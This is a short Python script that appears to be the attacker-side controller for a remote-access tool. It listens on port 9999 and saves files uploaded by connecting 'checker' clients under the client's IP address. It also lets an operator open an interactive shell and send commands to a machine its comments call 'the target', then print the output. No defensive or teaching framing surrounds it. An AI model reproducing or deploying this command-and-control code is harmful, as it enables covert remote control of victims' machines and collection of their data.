#!/usr/bin/env python

import socket
from datetime import datetime
import subprocess
import json

from pip._vendor.distlib.compat import raw_input

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 9999))
try:
	while True:
			s.listen(10)
			client, address = s.accept()
			print("{} connected".format( address ))
			response = client.recv(255).decode('ascii').lower()
			print(response)
			if "checker" in response:
				print("checker")
				now = datetime.now()
				dt_string = now.strftime("%d.%m.%Y-%H.%M.%S")
				with open("CheckerFrom-"+address[0]+'-'+dt_string+'.txt', 'wb') as file:
					l = client.recv(1024)
					while (l):
						file.write(l)
						l = client.recv(1024)


			elif "help" in response:
				print("help")

				shell=raw_input("Open shell yes/no : ")
				if "yes" in shell.lower():
					client.send("open".encode('ascii'))
					while True:
						command = raw_input("Shell> ")  # Get user input and store it in command variable
						if 'terminate' in command or 'exit' in command or 'quit' in command :  # If we got terminate command, inform the client and close the connect and break the loop
							print("Terminate"+command)
							client.send('terminate'.encode('ascii'))
							break
						else:
							client.send(command.encode('ascii'))  # Otherwise we will send the command to the target
							print(client.recv(1024).decode('ascii'))  # and print the result that we got back
				else:
					client.send("break".encode('ascii'))
except Exception as ex:
	print(ex)
finally:
	client.close()
	s.close()
